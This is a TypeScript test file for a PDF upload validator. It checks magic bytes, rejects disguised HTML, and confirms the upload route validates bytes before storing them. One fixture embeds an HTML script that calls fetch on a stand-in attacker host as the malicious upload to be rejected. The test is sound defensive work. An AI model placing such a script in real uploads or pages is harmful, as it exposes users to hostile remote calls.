import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { validarAssinaturaPDF } from '../utils/nomenclatura-padronizada';

function bytes(...parts: number[][]): Uint8Array {
  return new Uint8Array(parts.flat());
}

describe('validarAssinaturaPDF', () => {
  it('accepts a PDF signature at the beginning of the file', () => {
    const content = bytes(
      [0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37],
      [0x0a, 0x25, 0xe2, 0xe3, 0xcf, 0xd3],
    );

    expect(validarAssinaturaPDF(content)).toEqual({ valido: true });
  });

  it('accepts a small legacy prefix before the PDF signature', () => {
    const prefix = new Array(32).fill(0x20);
    const content = bytes(prefix, [0x25, 0x50, 0x44, 0x46, 0x2d, 0x32, 0x2e, 0x30]);
    const arrayBuffer = content.buffer.slice(
      content.byteOffset,
      content.byteOffset + content.byteLength,
    ) as ArrayBuffer;

    expect(validarAssinaturaPDF(arrayBuffer)).toEqual({ valido: true });
  });

  it('rejects HTML or script content disguised with a .pdf filename and MIME', () => {
    const disguisedHtml = new TextEncoder().encode(
      '<html><script>fetch("https://attacker.invalid")</script></html>',
    );

    const result = validarAssinaturaPDF(disguisedHtml);
    expect(result.valido).toBe(false);
    expect(result.erro).toContain('não possui assinatura de PDF');
  });

  it('does not accept a signature injected only after the header scan window', () => {
    const content = new Uint8Array(1100).fill(0x41);
    content.set([0x25, 0x50, 0x44, 0x46, 0x2d], 1050);

    expect(validarAssinaturaPDF(content).valido).toBe(false);
  });

  it('keeps the upload route validating bytes before writing to R2', () => {
    const routePath = new URL('../routes/pasta-virtual.ts', import.meta.url).pathname;
    const routeSource = readFileSync(routePath, 'utf8');
    const validationIndex = routeSource.indexOf('validarAssinaturaPDF(uint8Array)');
    const uploadIndex = routeSource.indexOf('await bucket.put(r2Key, uint8Array');

    expect(validationIndex).toBeGreaterThan(-1);
    expect(uploadIndex).toBeGreaterThan(validationIndex);
  });
});
